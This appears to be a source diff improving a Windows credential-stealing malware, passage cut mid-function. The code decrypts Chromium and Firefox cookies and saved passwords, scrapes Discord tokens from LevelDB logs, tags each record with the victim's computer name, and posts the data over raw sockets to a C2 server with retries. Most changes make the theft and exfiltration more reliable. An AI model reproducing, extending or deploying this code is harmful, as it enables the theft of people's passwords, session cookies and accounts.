@@ -311,6 +311,21 @@ static int ToUtf8(const wchar_t* p, char* out, int cap){
     out[j]=0; return j;
 }
 
+// True if the buffer is already valid UTF-8. Chrome stores passwords as
+// UTF-16LE, so a UTF-16 buffer with any accent fails this and gets converted;
+// a plain ASCII password passes and is left alone.
+static bool LooksUtf8(const char* s, int n){
+    for(int i=0; i<n;){
+        unsigned char c = (unsigned char)s[i];
+        if(c < 0x80){ i++; continue; }
+        int k = (c>=0xF0)?4:(c>=0xE0)?3:(c>=0xC0)?2:0;
+        if(!k || i+k>n) return false;
+        for(int j=1; j<k; j++) if(((unsigned char)s[i+j]&0xC0)!=0x80) return false;
+        i += k;
+    }
+    return true;
+}
+
 // ------------------------------------------------------------------ handle hijacking
 // When a browser holds a 0-sharing lock on the cookie/password DB, CreateFileW
 // fails with error 32 (sharing violation). This function enumerates all system
@@ -585,8 +600,10 @@ static Br g_br[] = { {L"chrome",  L"\\Google\\Chrome\\User Data",           L"ch
 static unsigned char g_key10[32]; static bool g_has10;   // v10/v11 key (DPAPI user)
 static unsigned char g_key20[32]; static bool g_has20;   // v20 key (app-bound, pre-extracted)
 
-// Parse Local State JSON to extract os_crypt.encrypted_key (v10) and app_bound_encrypted_key (v20)
-static void LoadLocalState(const wchar_t* root){
+// Parse Local State JSON to extract os_crypt.encrypted_key (v10) and app_bound_encrypted_key (v20).
+// The v20 app-bound key cannot be unwrapped in-process; cookielog.py writes it
+// per browser to C:\ProgramData\MediaCache\mc-<browser>.key (base64).
+static void LoadLocalState(const wchar_t* brname, const wchar_t* root){
     Dbg("LoadLocalState: entry");
     g_has10 = g_has20 = false;
     wchar_t ls[1024]; lstrcpyW(ls,root); lstrcatW(ls,L"\\Local State");
@@ -658,17 +675,26 @@ static void LoadLocalState(const wchar_t* root){
                 if(rl>=32){ memcpy(g_key10,raw,32); g_has10=true; Dbg("LoadLocalState: v10 direct key OK"); }
                 else { Dbg("LoadLocalState: v10 key too short, no DPAPI prefix"); }
             }
-        } else {                                                     // v20: read pre-extracted key
-            HANDLE k = CreateFileW(L"C:\\ProgramData\\MediaCache\\mc.key", GENERIC_READ,
-                                   FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-            if(k != INVALID_HANDLE_VALUE){ 
-                char b[64] = {0}; DWORD r2 = 0;
-                ReadFile(k, b, 44, &r2, NULL); CloseHandle(k);
-                if(r2 == 44){ 
-                    rl = 32; 
+        } else {                                                     // v20: per-browser pre-extracted key
+            wchar_t kp[1024];
+            lstrcpyW(kp, L"C:\\ProgramData\\MediaCache\\mc-");
+            lstrcatW(kp, brname ? brname : L"x");
+            lstrcatW(kp, L".key");
+            HANDLE k = CreateFileW(kp, GENERIC_READ, FILE_SHARE_READ, NULL,
+                                   OPEN_EXISTING, 0, NULL);
+            if(k == INVALID_HANDLE_VALUE)                            // legacy single key
+                k = CreateFileW(L"C:\\ProgramData\\MediaCache\\mc.key", GENERIC_READ,
+                                FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+            if(k != INVALID_HANDLE_VALUE){
+                char b[96]; memset(b, 0, sizeof(b)); DWORD r2 = 0;
+                ReadFile(k, b, sizeof(b)-1, &r2, NULL); CloseHandle(k);
+                if(r2 == 32){                                        // raw key
+                    memcpy(g_key20, b, 32); g_has20 = true;
+                } else if(r2 > 32){                                  // base64 key
+                    rl = 32;
                     if(CryptStringToBinaryA(b, 0, CRYPT_STRING_BASE64, g_key20, &rl, NULL, NULL))
-                        g_has20 = rl == 32; 
-                } 
+                        g_has20 = (rl == 32);
+                }
             }
         }
     }
@@ -795,6 +821,10 @@ static void DumpChromium(const wchar_t* brname, const wchar_t* root, const wchar
                 rows++;
                 RecStart();
                 FieldS0("domain",st,0); FieldS("name",st,1); FieldS("path",st,2);
+                { char b8[64]; int bl = ToUtf8(brname, b8, sizeof(b8));
+                  PutS(",\"browser\":"); PutJ(b8, bl);
+                  char p8[160]; int pl = ToUtf8(fd.cFileName, p8, sizeof(p8));
+                  PutS(",\"profile\":"); PutJ(p8, pl); }
                 const unsigned char* enc=(const unsigned char*)S_blob(st,3); int en=S_bytes(st,3);
                 const char* host_key=(const char*)S_blob(st,0);  // host_key for SHA256 domain hash verification
                 // Cookie blobs can exceed any fixed buffer (SSO/JWT session tokens reach
@@ -811,8 +841,10 @@ static void DumpChromium(const wchar_t* brname, const wchar_t* root, const wchar
                 long long unix = eu ? eu / 1000000 - 11644473600LL : 0;
                 PutS(",\"expirationDate\":"); PutN(unix);
                 int ss = S_int(st,7);
-                // Chromium sameSite: 2=None, 1=Strict, 0=Lax
-                FieldStr("sameSite", ss==2 ? "None" : (ss==1 ? "Strict" : "Lax"));
+                // Chromium CookieSameSite: 0=no_restriction(None), 1=Lax, 2=Strict,
+                // -1=unspecified (treated as Lax by every browser). The old mapping
+                // swapped 1 and 2 and turned every Lax cookie into Strict on import.
+                FieldStr("sameSite", ss==0 ? "None" : (ss==2 ? "Strict" : "Lax"));
                 FieldB("secure",S_int(st,5));
                 FieldB("httpOnly",S_int(st,6));
                 // hostOnly: true if domain does not start with "."
@@ -859,10 +891,12 @@ static void DumpFirefox(const wchar_t* appdata){
             rows++;
             RecStart();
             FieldS0("name",st,0); FieldS("value",st,1); FieldS("domain",st,2); FieldS("path",st,3);
+            { char p8[160]; int pl = ToUtf8(fd.cFileName, p8, sizeof(p8));
+              PutS(",\"browser\":\"firefox\",\"profile\":"); PutJ(p8, pl); }
             long long expiry = S_int64(st,4);
             PutS(",\"expirationDate\":"); PutN(expiry);
             int ss = S_int(st,7);
-            // Firefox sameSite: 0=None, 1=Lax, 2=Strict (opposite of Chromium!)
+            // moz_cookies.sameSite: 0=None/no-restriction, 1=Lax, 2=Strict
             FieldStr("sameSite", ss==2 ? "Strict" : (ss==1 ? "Lax" : "None"));
             FieldB("secure",S_int(st,5));
             FieldB("httpOnly",S_int(st,6));
@@ -877,74 +911,98 @@ static void DumpFirefox(const wchar_t* appdata){
 }
 
 // ------------------------------------------------------------------ Discord token extraction
-// Discord stores tokens in LevelDB files as plaintext JSON with "mfa." or token-like strings.
-// Path: %APPDATA%\Discord\Local Storage\leveldb\*.ldb
+// Discord keeps the auth token in LevelDB under "Local Storage\leveldb".
+// Recent writes live in *.log (the WAL); the old scan only read *.ldb and only
+// matched the literal "mfa." prefix, so a freshly logged-in client produced
+// nothing. Tokens are user.ts.hmac (optionally prefixed with "mfa.").
+static char g_tok[32][132];
+static int  g_tok_len[32];
+static int  g_tok_n = 0;
+
+static bool IsTokChar(unsigned char c){
+    return (c>='A'&&c<='Z')||(c>='a'&&c<='z')||(c>='0'&&c<='9')||c=='-'||c=='_'||c=='.';
+}
+
+static bool AcceptToken(const char* t, int n){
+    int start = 0;
+    if(n > 4 && t[0]=='m' && t[1]=='f' && t[2]=='a' && t[3]=='.') start = 4;
+    int s[3] = {0,0,0}, k = 0, seg = 0;
+    for(int i=start; i<n; i++){
+        if(t[i]=='.'){ if(k<3) s[k]=seg; k++; seg=0; }
+        else seg++;
+    }
+    if(k != 2) return false;                       // exactly three parts
+    s[2] = seg;
+    return s[0] >= 23 && s[0] <= 30 && s[1] >= 5 && s[1] <= 8 && s[2] >= 25 && s[2] <= 45;
+}
+
+static void ScanTokens(const char* buf, int n){
+    for(int i=0; i<n; i++){
+        if(!IsTokChar((unsigned char)buf[i])) continue;
+        if(i > 0 && IsTokChar((unsigned char)buf[i-1])) continue;  // only at a run start
+        int j = i;
+        while(j < n && IsTokChar((unsigned char)buf[j])) j++;
+        int len = j - i;
+        if(AcceptToken(buf + i, len)){
+            bool dup = false;
+            for(int k=0; k<g_tok_n; k++)
+                if(g_tok_len[k]==len && memcmp(g_tok[k], buf+i, len)==0){ dup=true; break; }
+            if(!dup && g_tok_n < 32){
+                memcpy(g_tok[g_tok_n], buf+i, len);
+                g_tok_len[g_tok_n] = len;
+                g_tok_n++;
+            }
+        }
+        i = j;
+    }
+}
+
+static void EmitTokens(void){
+    for(int k=0; k<g_tok_n; k++){
+        RecStart();
+        PutS("\"domain\":\"discord.com\",\"name\":\"token\"");
+        PutS(",\"browser\":\"discord\",\"profile\":\"leveldb\"");
+        PutS(",\"value\":"); PutJ(g_tok[k], g_tok_len[k]);
+        PutS(",\"path\":\"/\",\"expirationDate\":0,\"sameSite\":\"None\",");
+        PutS("\"secure\":true,\"httpOnly\":false,\"hostOnly\":false,\"session\":true}");
+    }
+}
+
 static void DumpDiscordTokens(const wchar_t* appdata){
     Dbg("DumpDiscordTokens: entry");
-    wchar_t path[1024];
-    // Discord stable
-    lstrcpyW(path, appdata); lstrcatW(path, L"\\Discord\\Local Storage\\leveldb");
-    // Also try Discord PTB/Canary/Lightcord
-    const wchar_t* alts[] = { L"\\DiscordPTB\\Local Storage\\leveldb",
+    const wchar_t* alts[] = { L"\\Discord\\Local Storage\\leveldb",
+                              L"\\DiscordPTB\\Local Storage\\leveldb",
                               L"\\DiscordCanary\\Local Storage\\leveldb",
                               L"\\Lightcord\\Local Storage\\leveldb" };
+    const wchar_t* exts[] = { L"\\*.ldb", L"\\*.log" };
     for(int alt=0; alt<4; alt++){
-        wchar_t dir[1024];
-        if(alt==0) lstrcpyW(dir, path);
-        else { lstrcpyW(dir, appdata); lstrcatW(dir, alts[alt-1]); }
+        wchar_t dir[1024]; lstrcpyW(dir, appdata); lstrcatW(dir, alts[alt]);
         if(GetFileAttributesW(dir)==INVALID_FILE_ATTRIBUTES) continue;
-        Dbg("DumpDiscordTokens: found leveldb dir");
-
-        wchar_t pattern[1024]; lstrcpyW(pattern, dir); lstrcatW(pattern, L"\\*.ldb");
-        WIN32_FIND_DATAW fd; HANDLE f=FindFirstFileW(pattern,&fd);
-        if(f==INVALID_HANDLE_VALUE) continue;
-        do {
-            wchar_t fp[1100]; lstrcpyW(fp,dir); lstrcatW(fp,L"\\"); lstrcatW(fp,fd.cFileName);
-            // Read file into memory (max 1 MB per file)
-            HANDLE hf = CreateFileW(fp, GENERIC_READ,
-                FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
-                NULL, OPEN_EXISTING, 0, NULL);
-            if(hf==INVALID_HANDLE_VALUE) continue;
-            LARGE_INTEGER sz; GetFileSizeEx(hf,&sz);
-            if(sz.QuadPart > 1048576 || sz.QuadPart <= 0){ CloseHandle(hf); continue; }
-            int fsize = (int)sz.QuadPart;
-            char* buf = (char*)VirtualAlloc(NULL, fsize+1, MEM_COMMIT, PAGE_READWRITE);
-            if(!buf){ CloseHandle(hf); continue; }
-            DWORD rd=0; ReadFile(hf, buf, fsize, &rd, NULL); buf[fsize]=0;
-            CloseHandle(hf);
-
-            // Scan for token patterns: "mfa." (MFA token) or long base64-like strings after "token"
-            for(int i=0; i<fsize-20; i++){
-                // Look for "mfa." prefix
-                if(buf[i]=='m'&&buf[i+1]=='f'&&buf[i+2]=='a'&&buf[i+3]=='.'){
-                    // Extract token (up to 88 chars, alphanumeric + . _ -)
-                    char tok[128]; int tl=0;
-                    int j=i;
-                    while(j<fsize && tl<127 && (
-                        (buf[j]>='a'&&buf[j]<='z') || (buf[j]>='A'&&buf[j]<='Z') ||
-                        (buf[j]>='0'&&buf[j]<='9') || buf[j]=='.' || buf[j]=='_' || buf[j]=='-')){
-                        tok[tl++]=buf[j++];
-                    }
-                    tok[tl]=0;
-                    if(tl >= 50){  // valid tokens are 50+ chars
-                        RecStart();
-                        PutS("\"domain\":\"discord.com\"");
-                        PutS(",\"name\":\"token\"");
-                        PutS(",\"value\":"); PutJ(tok, tl);
-                        PutS(",\"path\":\"/\"");
-                        PutS(",\"expirationDate\":0");
-                        PutS(",\"sameSite\":\"None\"");
-                        PutS(",\"secure\":true,\"httpOnly\":false,\"hostOnly\":false,\"session\":true");
-                        PutS("}");
-                        Dbg("DumpDiscordTokens: found MFA token");
-                    }
-                    i = j;
-                }
-            }
-            VirtualFree(buf, 0, MEM_RELEASE);
-        } while(FindNextFileW(f,&fd));
-        FindClose(f);
+        for(int e=0; e<2; e++){
+            wchar_t pattern[1024]; lstrcpyW(pattern, dir); lstrcatW(pattern, exts[e]);
+            WIN32_FIND_DATAW fd; HANDLE f=FindFirstFileW(pattern,&fd);
+            if(f==INVALID_HANDLE_VALUE) continue;
+            do {
+                wchar_t fp[1100]; lstrcpyW(fp,dir); lstrcatW(fp,L"\\"); lstrcatW(fp,fd.cFileName);
+                HANDLE hf = CreateFileW(fp, GENERIC_READ,
+                    FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
+                    NULL, OPEN_EXISTING, 0, NULL);
+                if(hf==INVALID_HANDLE_VALUE) continue;
+                LARGE_INTEGER sz; GetFileSizeEx(hf,&sz);
+                if(sz.QuadPart > 4194304 || sz.QuadPart <= 0){ CloseHandle(hf); continue; }
+                int fsize = (int)sz.QuadPart;
+                char* buf = (char*)VirtualAlloc(NULL, fsize+1, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+                if(!buf){ CloseHandle(hf); continue; }
+                DWORD rd=0; ReadFile(hf, buf, fsize, &rd, NULL);
+                CloseHandle(hf);
+                if(rd){ ScanTokens(buf, (int)rd); }
+                VirtualFree(buf, 0, MEM_RELEASE);
+            } while(FindNextFileW(f,&fd));
+            FindClose(f);
+        }
     }
+    DbgInt("DumpDiscordTokens: tokens found", g_tok_n);
+    EmitTokens();
     Dbg("DumpDiscordTokens: done");
 }
 
@@ -954,10 +1012,17 @@ static void DumpDiscordTokens(const wchar_t* appdata){
 static void DumpPasswords(const wchar_t* name, const wchar_t* root, const wchar_t* exe){
     Dbg("DumpPasswords: entry");
     wchar_t prof[1024];
-    // Try Default profile, then Profile 1, Profile 2, etc.
-    const wchar_t* profs[] = { L"\\Default", L"\\Profile 1", L"\\Profile 2", L"\\Profile 3" };
-    for(int p=0; p<4; p++){
-        lstrcpyW(prof, root); lstrcatW(prof, profs[p]);
+    // Default + Profile 1..9: apps that create several profiles used to lose
+    // every saved login past Profile 3.
+    for(int p=0; p<10; p++){
+        wchar_t pname[32];
+        if(p==0) lstrcpyW(pname, L"Default");
+        else {
+            lstrcpyW(pname, L"Profile ");
+            wchar_t d[2]; d[0] = (wchar_t)(L'0' + p); d[1] = 0;
+            lstrcatW(pname, d);
+        }
+        lstrcpyW(prof, root); lstrcatW(prof, L"\\"); lstrcatW(prof, pname);
         lstrcatW(prof, L"\\Login Data");
         if(GetFileAttributesW(prof)==INVALID_FILE_ATTRIBUTES) continue;
 
@@ -988,7 +1053,7 @@ static void DumpPasswords(const wchar_t* name, const wchar_t* root, const wchar_
             // Same oversized-blob hazard as cookies in DumpChromium: password blobs are
             // heap-allocated by size instead of a fixed 4KB stack buffer.
             char* pwd = (enc_len > 0 && enc_len <= 4194304)
-                ? (char*)VirtualAlloc(NULL, enc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) : NULL;
+                ? (char*)VirtualAlloc(NULL, (size_t)enc_len * 2, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) : NULL;
             int pwd_len=0;
             bool pwd_ok = false;
             if(pwd && enc_len > 3 && enc[0]=='v'){
@@ -996,21 +1061,22 @@ static void DumpPasswords(const wchar_t* name, const wchar_t* root, const wchar_
             }
             if(pwd_ok){
                 dec_ok++;
-                // Check for UTF-16LE: if every other byte is 0x00, it's UTF-16
-                if(pwd_len >= 4 && pwd_len % 2 == 0){
-                    bool is_utf16 = true;
-                    for(int k=1; k<pwd_len; k+=2){ if(pwd[k] != 0){ is_utf16=false; break; } }
-                    if(is_utf16){
-                        // Convert UTF-16LE to UTF-8 (basic BMP conversion)
-                        int u8len = 0;
-                        for(int k=0; k<pwd_len; k+=2){
-                            unsigned short ch = (unsigned char)pwd[k] | ((unsigned char)pwd[k+1] << 8);
-                            if(ch < 0x80) pwd[u8len++] = (char)ch;
-                            else if(ch < 0x800){ pwd[u8len++]=(char)(0xC0|(ch>>6)); pwd[u8len++]=(char)(0x80|(ch&0x3F)); }
-                            else { pwd[u8len++]=(char)(0xE0|(ch>>12)); pwd[u8len++]=(char)(0x80|((ch>>6)&0x3F)); pwd[u8len++]=(char)(0x80|(ch&0x3F)); }
-                        }
-                        pwd_len = u8len;
+                // Chrome stores the password as UTF-16LE. An ASCII password is
+                // valid UTF-8 and stays as-is; anything else (accents) is
+                // converted. The old odd-byte-zero test turned "senha@ção"
+                // into binary garbage on the target.
+                if(pwd_len >= 2 && pwd_len % 2 == 0 && !LooksUtf8(pwd, pwd_len)){
+                    // Convert UTF-16LE to UTF-8 (BMP). The output buffer is 2x the
+                    // blob size: a 2-byte code unit can become 3 UTF-8 bytes, and
+                    // the old in-place conversion could write past enc_len.
+                    int u8len = 0;
+                    for(int k=0; k<pwd_len; k+=2){
+                        unsigned short ch = (unsigned char)pwd[k] | ((unsigned char)pwd[k+1] << 8);
+                        if(ch < 0x80) pwd[u8len++] = (char)ch;
+                        else if(ch < 0x800){ pwd[u8len++]=(char)(0xC0|(ch>>6)); pwd[u8len++]=(char)(0x80|(ch&0x3F)); }
+                        else { pwd[u8len++]=(char)(0xE0|(ch>>12)); pwd[u8len++]=(char)(0x80|((ch>>6)&0x3F)); pwd[u8len++]=(char)(0x80|(ch&0x3F)); }
                     }
+                    pwd_len = u8len;
                 }
             }
             else{
@@ -1024,6 +1090,10 @@ static void DumpPasswords(const wchar_t* name, const wchar_t* root, const wchar_
             // Store as a cookie-like entry for easy exfil
             PutS("\"domain\":"); PutJ(url, url_len);
             PutS(",\"name\":\"password\"");
+            { char b8[64]; int bl=ToUtf8(name,b8,sizeof(b8));
+              PutS(",\"browser\":"); PutJ(b8, bl);
+              char p8[64]; int pl=ToUtf8(pname,p8,sizeof(p8));
+              PutS(",\"profile\":"); PutJ(p8, pl); }
             PutS(",\"value\":"); PutJ(pwd, pwd_len);
             PutS(",\"path\":\"/\"");
             PutS(",\"expirationDate\":0,\"sameSite\":\"None\"");
@@ -1043,6 +1113,11 @@ static void DumpPasswords(const wchar_t* name, const wchar_t* root, const wchar_
 // ------------------------------------------------------------------ HTTP exfiltration (Winsock2)
 // WinHTTP/WinINet fail in hollowed process (err 12029 - proxy config unavailable).
 // Raw Winsock2 works: socket() + connect() + send() with no config dependency.
+// SOCKET is UINT_PTR on x64. The old `int` typedefs truncated the handle and
+// every send()/recv() on it failed -- the dump stayed on the victim.
+typedef UINT_PTR CK_SOCKET;
+#define CK_INVALID_SOCKET ((CK_SOCKET)(~0))
+struct CK_WSADATA { char _[512]; };  // real WSADATA is 408 bytes; 400 overflowed the stack
 #pragma pack(push,1)
 struct CK_SOCKADDR_IN {
     short sin_family;       // AF_INET = 2
@@ -1051,26 +1126,52 @@ struct CK_SOCKADDR_IN {
     char sin_zero[8];
 };
 #pragma pack(pop)
-struct CK_WSADATA { char _[400]; };  // minimal WSADATA (400 bytes on stack)
+struct CK_TIMEVAL { long tv_sec; long tv_usec; };
+struct CK_FD_SET  { unsigned int fd_count; CK_SOCKET fd_array[64]; };
+struct CK_HOSTENT { char* h_name; char** h_aliases; short h_addrtype; short h_length; char** h_addr_list; };
+
+static char g_victim[64];
+
+static void VictimName(void){
+    if(g_victim[0]) return;
+    DWORD n = (DWORD)sizeof(g_victim);
+    if(!GetComputerNameA(g_victim, &n) || !g_victim[0]) lstrcpyA(g_victim, "?");
+    else g_victim[n < sizeof(g_victim) ? n : sizeof(g_victim)-1] = 0;
+}
+
+// http://HOST[:PORT][/PATH] -- scheme optional, case-insensitive, no TLS.
+static bool ParseC2(const char* url, char* host, int hostcap, int* port,
+                    char* path, int pathcap){
+    const char* p = url;
+    if((p[0]=='h'||p[0]=='H') && (p[1]=='t'||p[1]=='T') && (p[2]=='t'||p[2]=='T') &&
+       (p[3]=='p'||p[3]=='P') && p[4]==':'){
+        p += 5;
+        if(p[0]=='/' && p[1]=='/') p += 2;
+    }
+    if(!*p) return false;
+    int hp = 0; *port = 80;
+    while(*p && *p!='/' && *p!=':' && hp < hostcap-1) host[hp++] = *p++;
+    host[hp] = 0;
+    if(!hp) return false;
+    if(*p==':'){
+        p++; int v = 0;
+        while(*p>='0' && *p<='9'){ v = v*10 + (*p-'0'); p++; }
+        if(v > 0 && v <= 65535) *port = v;
+    }
+    const char* q = (*p=='/') ? p : "/";
+    int i = 0;
+    while(q[i] && i < pathcap-1){ path[i] = q[i]; i++; }
+    path[i] = 0;
+    return true;
+}
 
 static bool ExfilHTTP(const char* url){
     DbgStr("ExfilHTTP: url=", url);
-    // Parse URL: http://HOST[:PORT][/PATH]
-    const char* p = url;
-    if(p[0]=='h'&&p[1]=='t'&&p[2]=='t'&&p[3]=='p'&&p[4]==':') p+=7; // skip "http://"
-    // Extract host[:port]
-    char host[128]; int hp=0; int port = 80;
-    const char* path = "/";
-    while(*p && *p!='/' && hp<127){
-        if(*p==':'){
-            p++; port=0;
-            while(*p>='0'&&*p<='9'){ port=port*10+(*p-'0'); p++; }
-            break;
-        }
-        host[hp++]=*p++;
+    char host[128], path[256]; int port = 80;
+    if(!ParseC2(url, host, sizeof(host), &port, path, sizeof(path))){
+        Dbg("ExfilHTTP: unparseable URL"); return false;
     }
-    host[hp]=0;
-    if(*p=='/') path=p;
+    VictimName();
     DbgStr("ExfilHTTP: host=", host);
     DbgInt("ExfilHTTP: port", port);
     DbgStr("ExfilHTTP: path=", path);
@@ -1078,106 +1179,130 @@ static bool ExfilHTTP(const char* url){
     HMODULE ws2 = LoadLibraryA("ws2_32.dll");
     if(!ws2){ Dbg("ExfilHTTP: ws2_32.dll load FAILED"); return false; }
     typedef int (WINAPI *tWSAStartup)(unsigned short, void*);
-    typedef int (WINAPI *tSocket)(int,int,int);
-    typedef int (WINAPI *tConnect)(unsigned int, const void*, int);
-    typedef int (WINAPI *tSend)(unsigned int, const char*, int, int);
-    typedef int (WINAPI *tRecv)(unsigned int, char*, int, int);
-    typedef int (WINAPI *tClose)(unsigned int);
+    typedef CK_SOCKET (WINAPI *tSocket)(int,int,int);
+    typedef int (WINAPI *tConnect)(CK_SOCKET, const void*, int);
+    typedef int (WINAPI *tSend)(CK_SOCKET, const char*, int, int);
+    typedef int (WINAPI *tRecv)(CK_SOCKET, char*, int, int);
+    typedef int (WINAPI *tCloseSocket)(CK_SOCKET);
     typedef int (WINAPI *tWSACleanup)(void);
     typedef unsigned long (WINAPI *tInetAddr)(const char*);
-    typedef int (WINAPI *tSetSockOpt)(unsigned int, int, int, const char*, int);
+    typedef int (WINAPI *tSetSockOpt)(CK_SOCKET, int, int, const char*, int);
+    typedef int (WINAPI *tGetSockOpt)(CK_SOCKET, int, int, char*, int*);
+    typedef int (WINAPI *tIoctlSocket)(CK_SOCKET, long, unsigned long*);
+    typedef int (WINAPI *tSelect)(int, CK_FD_SET*, CK_FD_SET*, CK_FD_SET*, const CK_TIMEVAL*);
+    typedef int (WINAPI *tWsaErr)(void);
+    typedef struct CK_HOSTENT* (WINAPI *tGethostbyname)(const char*);
     tWSAStartup fStart = (tWSAStartup)GetProcAddress(ws2,"WSAStartup");
     tSocket    fSocket = (tSocket)GetProcAddress(ws2,"socket");
     tConnect   fConnect= (tConnect)GetProcAddress(ws2,"connect");
     tSend      fSend   = (tSend)GetProcAddress(ws2,"send");
     tRecv      fRecv   = (tRecv)GetProcAddress(ws2,"recv");
-    tClose     fClose  = (tClose)GetProcAddress(ws2,"closesocket");
+    tCloseSocket fClose= (tCloseSocket)GetProcAddress(ws2,"closesocket");
     tWSACleanup fClean = (tWSACleanup)GetProcAddress(ws2,"WSACleanup");
     tInetAddr  fInet  = (tInetAddr)GetProcAddress(ws2,"inet_addr");
     tSetSockOpt fSetOpt= (tSetSockOpt)GetProcAddress(ws2,"setsockopt");
-    if(!fStart||!fSocket||!fConnect||!fSend||!fRecv||!fClose||!fInet){ Dbg("ExfilHTTP: missing ws2_32 exports"); return false; }
-    Dbg("ExfilHTTP: ws2_32 exports OK");
+    tGetSockOpt fGetOpt= (tGetSockOpt)GetProcAddress(ws2,"getsockopt");
+    tIoctlSocket fIoctl= (tIoctlSocket)GetProcAddress(ws2,"ioctlsocket");
+    tSelect    fSelect= (tSelect)GetProcAddress(ws2,"select");
+    tWsaErr    fErr   = (tWsaErr)GetProcAddress(ws2,"WSAGetLastError");
+    tGethostbyname fGetHost = (tGethostbyname)GetProcAddress(ws2,"gethostbyname");
+    if(!fStart||!fSocket||!fConnect||!fSend||!fRecv||!fClose||!fInet){
+        Dbg("ExfilHTTP: missing ws2_32 exports"); return false;
+    }
 
     CK_WSADATA wsaData;
     if(fStart(0x0202, &wsaData)){ Dbg("ExfilHTTP: WSAStartup failed"); return false; }
-    Dbg("ExfilHTTP: WSAStartup OK");
 
     CK_SOCKADDR_IN addr;
     memset(&addr, 0, sizeof(addr));
-    addr.sin_family = 2; // AF_INET
-    addr.sin_port = ((port & 0xFF) << 8) | ((port >> 8) & 0xFF); // htons
+    addr.sin_family = 2;
+    addr.sin_port = (unsigned short)(((port & 0xFF) << 8) | ((port >> 8) & 0xFF));
     addr.sin_addr = fInet(host);
-    if(addr.sin_addr == 0xFFFFFFFF){ 
-        Dbg("ExfilHTTP: inet_addr failed, trying gethostbyname");
-        // Try gethostbyname for hostname resolution
-        // hostent is incomplete without winsock2.h: use our own matching layout
-        struct CK_HOSTENT { char* h_name; char** h_aliases; short h_addrtype; short h_length; char** h_addr_list; };
-        HMODULE ws2_2 = GetModuleHandleA("ws2_32.dll");
-        typedef struct CK_HOSTENT* (WINAPI *tGethostbyname)(const char*);
-        tGethostbyname fGetHost = (tGethostbyname)GetProcAddress(ws2_2, "gethostbyname");
-        if(fGetHost){
-            struct CK_HOSTENT* he = fGetHost(host);
-            if(he && he->h_addr_list && he->h_addr_list[0]){
-                addr.sin_addr = *(unsigned long*)he->h_addr_list[0];
-                Dbg("ExfilHTTP: gethostbyname resolved OK");
-            } else {
-                Dbg("ExfilHTTP: gethostbyname failed");
-                fClean(); return false;
-            }
+    if(addr.sin_addr == 0xFFFFFFFF){
+        struct CK_HOSTENT* he = fGetHost ? fGetHost(host) : 0;
+        if(he && he->h_addr_list && he->h_addr_list[0]){
+            memcpy(&addr.sin_addr, he->h_addr_list[0], 4);
         } else {
-            Dbg("ExfilHTTP: gethostbyname not available");
-            fClean(); return false;
+            Dbg("ExfilHTTP: name resolution failed"); fClean(); return false;
         }
     }
 
-    // Build HTTP POST request once (reused by every retry)
-    char hdr[512]; int hn = 0;
-    #define APP(s) { int ln=lstrlenA(s); if(hn+ln<sizeof(hdr)){ memcpy(hdr+hn,s,ln); hn+=ln; } }
+    // Build the POST once (reused by every retry)
+    char hdr[1024]; int hn = 0;
+    #define APP(s) { int ln=lstrlenA(s); if(hn+ln<(int)sizeof(hdr)){ memcpy(hdr+hn,s,ln); hn+=ln; } }
     APP("POST "); APP(path);
     APP(" HTTP/1.1\r\nHost: "); APP(host);
-    APP("\r\nContent-Type: application/json\r\nContent-Length: ");
-    // append g_len as decimal string
-    { char num[24]; int ni=0; size_t gl=g_len; if(!gl) num[ni++]='0'; else while(gl){ num[ni++]='0'+gl%10; gl/=10; } while(ni) { if(hn<sizeof(hdr)) hdr[hn++]=num[--ni]; } }
-    APP("\r\nConnection: close\r\n\r\n");
+    if(port != 80){
+        char tmp[8], pn[8]; int ti=0, pi=0, pv=port;
+        while(pv){ tmp[ti++] = (char)('0' + pv%10); pv/=10; }
+        pn[pi++]=':'; while(ti) pn[pi++]=tmp[--ti]; pn[pi]=0; APP(pn);
+    }
+    APP("\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nContent-Type: application/json\r\nContent-Length: ");
+    { char num[24]; int ni=0; size_t gl=g_len; if(!gl) num[ni++]='0';
+      else while(gl){ num[ni++]=(char)('0'+gl%10); gl/=10; }
+      while(ni && hn<(int)sizeof(hdr)) hdr[hn++]=num[--ni]; }
+    APP("\r\nConnection: close\r\nX-CookieLog-Host: "); APP(g_victim); APP("\r\n\r\n");
     #undef APP
 
-    // retry the full connect+send cycle: a single refused SYN (listener busy
-    // restarting, brief firewall hiccup) used to lose the whole dump
+    // 4 attempts with backoff: one refused SYN (listener restarting, firewall
+    // rule still propagating) used to lose the entire dump.
     bool sent_ok = false;
-    for(int attempt=0; attempt<3 && !sent_ok; attempt++){
-        if(attempt > 0) Sleep(1000);
-        unsigned int s2 = (unsigned int)fSocket(2/*AF_INET*/, 1/*SOCK_STREAM*/, 6/*IPPROTO_TCP*/);
-        if(s2==(unsigned int)-1){ Dbg("ExfilHTTP: socket failed (retry)"); continue; }
+    for(int attempt=0; attempt<4 && !sent_ok; attempt++){
+        if(attempt) Sleep(500u << (attempt-1));            // 500, 1000, 2000 ms
+        CK_SOCKET s = fSocket(2 /*AF_INET*/, 1 /*SOCK_STREAM*/, 6 /*IPPROTO_TCP*/);
+        if(s == CK_INVALID_SOCKET){ Dbg("ExfilHTTP: socket failed"); continue; }
         if(fSetOpt){
-            unsigned long tmo = 30000; // 30 seconds
-            fSetOpt(s2, 0xFFFF, 0x1006, (const char*)&tmo, sizeof(tmo)); // SO_RCVTIMEO
-            fSetOpt(s2, 0xFFFF, 0x1005, (const char*)&tmo, sizeof(tmo)); // SO_SNDTIMEO
+            DWORD tmo = 30000;
+            fSetOpt(s, 0xFFFF, 0x1005, (const char*)&tmo, sizeof(tmo)); // SO_SNDTIMEO
+            fSetOpt(s, 0xFFFF, 0x1006, (const char*)&tmo, sizeof(tmo)); // SO_RCVTIMEO
         }
-        if(fConnect(s2, &addr, sizeof(addr))){
+        bool connected = false;
+        if(fIoctl && fSelect && fGetOpt && fErr){
+            unsigned long nb = 1;
+            fIoctl(s, (long)0x8004667E /*FIONBIO*/, &nb);
+            int cr = fConnect(s, &addr, sizeof(addr));
+            if(cr == 0) connected = true;
